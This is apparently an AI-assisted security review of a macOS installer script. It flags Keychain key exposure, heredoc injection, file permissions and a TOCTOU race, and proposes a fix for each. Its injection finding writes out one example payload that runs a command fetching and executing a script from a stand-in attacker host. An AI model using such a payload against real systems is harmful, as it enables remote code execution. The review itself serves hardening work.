# Prism Review: Integration Critic

## Verdict: NEEDS REVISION

**Overall Assessment:** The 5 security fixes are well-designed individually, but integration introduced 3 critical issues and 5 significant gaps. Most are solvable with minor code changes. The script should NOT ship until these are addressed.

---

## Conflicts Found (3 issues)

### ⚠️ CONFLICT-1: Keychain Isolation vs. Shell Variable Exposure (CRITICAL)

**The Problem:**
Fix 1.1 (Keychain) aims to keep API keys out of environment/shell variables. But in `step3_start()`, keys are retrieved from Keychain into shell variables before being passed to Python:

```bash
local openrouter_key=""
local anthropic_key=""
openrouter_key=$(keychain_get "$KEYCHAIN_ACCOUNT_OPENROUTER")
anthropic_key=$(keychain_get "$KEYCHAIN_ACCOUNT_ANTHROPIC")
# ... later ...
python3 << PYEOF
openrouter_key = '''$openrouter_key'''
anthropic_key = '''$anthropic_key'''
```

**Why It Matters:**
- Keys exist in shell memory from line 1252-1340 (~90 lines)
- If script crashes/interrupted, keys remain in shell variables
- Unquoted heredoc delimiter allows shell expansion, exposing keys in process substitution
- **Bypasses the entire point of Fix 1.1**

**Fix:**
Pass keys directly to Python via stdin using `security find-generic-password` inside Python subprocess, or use environment variables with `env -i` isolation.

---

### ⚠️ CONFLICT-2: Validated Input Bypasses Validation in Heredoc

**The Problem:**
`guided_api_signup()` validates the API key with `validate_api_key()`, but then returns it via `echo "$key"` to be captured in `step2_configure()`:

```bash
api_key=$(guided_api_signup)  # Key in shell variable
```

This creates a shell variable exposure between validation and Keychain storage, contradicting Fix 1.1's goal.

**Why It Matters:**
- Key exists in `$api_key` for ~30 lines before being stored in Keychain
- Other shell functions could accidentally log/leak this variable
- Process list (`ps`) might expose it if the script is backgrounded

**Fix:**
Have `guided_api_signup()` store directly to Keychain instead of returning the key. Return success/failure code only.

---

### ⚠️ CONFLICT-3: Duplicate Validation Logic (Bash vs. Python)

**The Problem:**
Input validation exists in both Bash (Fix 1.2) and Python (defense-in-depth in config generation):

```bash
# Bash validation
validate_model "$default_model"

# Python validation (duplicated logic)
ALLOWED_MODELS = [...]
if model not in ALLOWED_MODELS:
    print(f"ERROR: Model '{model}' not in allowed list", file=sys.stderr)
```

**Why It Matters:**
- If ALLOWED_MODELS is updated in Bash, Python must be updated manually
- Introduces maintenance burden and risk of drift
- Already happened: Bash has 9 models, Python code appears to replicate but could diverge

**Fix:**
Generate Python's ALLOWED_MODELS list from Bash's `ALLOWED_MODELS[@]` array dynamically, or validate once and trust the environment.

---

## Gaps Found (5 issues)

### 🔍 GAP-1: Template Path Construction Not Validated Against Allowlist

**The Problem:**
Template names are validated (`^[a-zA-Z][a-zA-Z0-9-]*$`), but the full constructed path isn't checked against `TEMPLATE_CHECKSUMS` keys before use:

```bash
local template_path="workflows/${template_name}/AGENTS.md"
verify_and_download_template "$template_path" "$workspace_dir/AGENTS.md"
```

If `$template_name` is "content-creator", path becomes `workflows/content-creator/AGENTS.md` — but nothing ensures this path exists in `TEMPLATE_CHECKSUMS` before attempting download.

**Why It Matters:**
- User could select invalid template, script attempts download, only fails at checksum lookup
- Error message is generic: "No checksum defined for: $template_path"
- Should fail early with clear error: "Unknown template: content-creator"

**Fix:**
Add `validate_template_name()` that checks both regex AND existence in TEMPLATE_CHECKSUMS.

---

### 🔍 GAP-2: Cache Directory Permissions Not Explicit

**The Problem:**
`CACHE_DIR` is created with `mkdir -p` but no explicit `chmod`:

```bash
mkdir -p "$CACHE_DIR"  # Line 223 in verify_and_download_template
```

Inherits default umask, which is typically 022 (world-readable).

**Why It Matters:**
- Cached templates are world-readable by default
- While templates are public GitHub files, CACHE_DIR structure leaks user's template choices
- Inconsistent with Fix 1.3's secure file creation pattern

**Fix:**
```bash
mkdir -p "$CACHE_DIR"
chmod 700 "$CACHE_DIR"
```

---

### 🔍 GAP-3: Verification Log Permissions Not Explicit

**The Problem:**
`VERIFICATION_LOG` is created via `echo >> $VERIFICATION_LOG` but never chmod'd:

```bash
log_verification() {
    local timestamp
    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    mkdir -p "$(dirname "$VERIFICATION_LOG")"
    echo "[$timestamp] $1" >> "$VERIFICATION_LOG"  # No chmod
}
```

**Why It Matters:**
- Log may contain template paths, download attempts, security events
- World-readable by default (umask 022)
- Inconsistent with Fix 1.3's secure file creation

**Fix:**
Create log file with secure permissions before first write:
```bash
if [ ! -f "$VERIFICATION_LOG" ]; then
    touch "$VERIFICATION_LOG"
    chmod 600 "$VERIFICATION_LOG"
fi
```

---

### 🔍 GAP-4: Gateway Token Printed to Stdout

**The Problem:**
Python config generation prints the gateway token:

```python
print(f"\n  Gateway Token: {gateway_token}")
print("  Save this — you need it for the dashboard.\n")
```

**Why It Matters:**
- Token appears in shell history if output is captured
- Visible in terminal scrollback
- Could be logged by terminal multiplexers
- Inconsistent with Fix 1.1's Keychain storage philosophy

**Fix:**
Don't print the token. It's already in Keychain. Provide retrieval command:
```bash
echo "  Gateway token stored in Keychain."
echo "  Retrieve with: security find-generic-password -s ai.openclaw -a gateway-token -w"
```

---

### 🔍 GAP-5: TOCTOU in Cached Template Verification

**The Problem:**
Race condition between checking cache file existence and verifying checksum:

```bash
if [ -f "$cache_file" ]; then
    if verify_sha256 "$cache_file" "$expected_checksum" 2>/dev/null; then
        # File could be replaced between check and copy
        cp "$cache_file" "$destination"
```

**Why It Matters:**
- Between existence check and checksum verification, file could be replaced by attacker
- Between checksum verification and `cp`, file could be replaced again
- Classic Time-of-Check-Time-of-Use (TOCTOU) vulnerability

**Fix:**
Use atomic operations:
```bash
cp "$cache_file" "$temp_secure_copy"  # Copy to temp
verify_sha256 "$temp_secure_copy" "$expected_checksum"  # Verify copy
mv "$temp_secure_copy" "$destination"  # Atomic move
```

---

## New Vulnerabilities (2 issues)

### 🚨 VULN-1: Unquoted Heredoc Enables Command Injection via Keychain

**The Problem:**
The Python heredoc delimiter is unquoted (`PYEOF` not `'PYEOF'`), enabling shell variable expansion:

```bash
python3 << PYEOF
openrouter_key = '''$openrouter_key'''
```

If an attacker compromises Keychain and stores a malicious value like:
```
'; import os; os.system("curl evil.com/pwn.sh | bash"); x='
```

The shell expands this BEFORE passing to Python, enabling command injection.

**Why It Matters:**
- Keychain compromise escalates to arbitrary code execution
- Defense-in-depth principle violated: one breach shouldn't enable another
- Fix 1.1 assumes Keychain is trusted, but doesn't defend against Keychain compromise

**Fix:**
Quote the heredoc delimiter:
```bash
python3 << 'PYEOF'
```
Then pass keys via environment:
```bash
OPENROUTER_KEY="$openrouter_key" python3 << 'PYEOF'
import os
openrouter_key = os.environ.get('OPENROUTER_KEY', '')
```

---

### 🚨 VULN-2: Skill Pack Heredocs Append Without Existence Check

**The Problem:**
Skill packs check for marker comments but not for `AGENTS.md` corruption:

```bash
if grep -q "QUALITY_PACK_INSTALLED" "$workspace_dir/AGENTS.md" 2>/dev/null; then
    warn "Quality Pack already installed, skipping"
else
    cat >> "$workspace_dir/AGENTS.md" << 'QUALITYEOF'
```

**Why It Matters:**
- If `AGENTS.md` is truncated/corrupted, `grep` fails silently and skill pack appends
- User could have manually removed marker but not skill content
- Leads to duplicate skill pack installations

**Fix:**
More robust detection:
```bash
if [ ! -f "$workspace_dir/AGENTS.md" ]; then
    touch "$workspace_dir/AGENTS.md"
    chmod 600 "$workspace_dir/AGENTS.md"
fi
if grep -q "QUALITY_PACK_INSTALLED" "$workspace_dir/AGENTS.md"; then
    # Also check for actual skill content
    if grep -q "systematic-debugging" "$workspace_dir/AGENTS.md"; then
        warn "Quality Pack already installed, skipping"
    else
        warn "Quality Pack marker found but content missing, reinstalling"
        # Remove marker and reinstall
    fi
fi
```

---

## Positive Findings

### ✅ What's Done Well

1. **Comprehensive validation coverage**: Fix 1.2 covers all major input vectors (bot name, model, API key, security level, personality, menu selections)

2. **Defense in depth**: Validation exists in both Bash and Python (though duplicated, it's better than single-layer)

3. **Secure file creation pattern**: Fix 1.3's `touch + chmod` pattern is consistently applied to config files, AGENTS.md, and workspace files

4. **Checksum verification**: Fix 1.4's SHA256 verification is thorough and includes logging

5. **Plist validation**: Fix 1.5's `plutil -lint` check ensures generated plist is valid before installation

6. **Allowlist approach**: Using strict allowlists (ALLOWED_MODELS, etc.) instead of blocklists is the correct approach

7. **Clear security documentation**: The script header clearly lists all 5 fixes, making audit easier

---

## Recommendation

**DO NOT SHIP** until these are fixed:

### Must Fix Before Ship (Critical):
- **CONFLICT-1**: Eliminate shell variable exposure for API keys (use Python subprocess or env -i)
- **VULN-1**: Quote Python heredoc delimiter to prevent expansion-based injection

### Should Fix Before Ship (High Priority):
- **CONFLICT-2**: Have `guided_api_signup()` store directly to Keychain
- **GAP-4**: Don't print gateway token to stdout
- **GAP-5**: Fix TOCTOU in cache file verification

### Nice to Fix (Medium Priority):
- **CONFLICT-3**: Generate Python validation from Bash arrays dynamically
- **GAP-1**: Validate template names against TEMPLATE_CHECKSUMS allowlist
- **GAP-2**: Explicit chmod 700 for CACHE_DIR
- **GAP-3**: Explicit chmod 600 for VERIFICATION_LOG
- **VULN-2**: Improve skill pack duplicate detection

### Estimated Effort:
- Critical fixes: 2-3 hours
- High priority: 1-2 hours
- Medium priority: 1 hour
- **Total: 4-6 hours**

---

## Final Verdict

The security fixes are **conceptually sound** but **implementation has integration flaws**. The biggest issue is that Fix 1.1 (Keychain isolation) is undermined by shell variable exposure in `step3_start()` and `guided_api_signup()`.

Once the critical issues are addressed, this will be a solid hardened installer. The fixes themselves don't conflict — the integration just needs tightening.

**Status: NEEDS REVISION → Fix critical issues → Re-review**
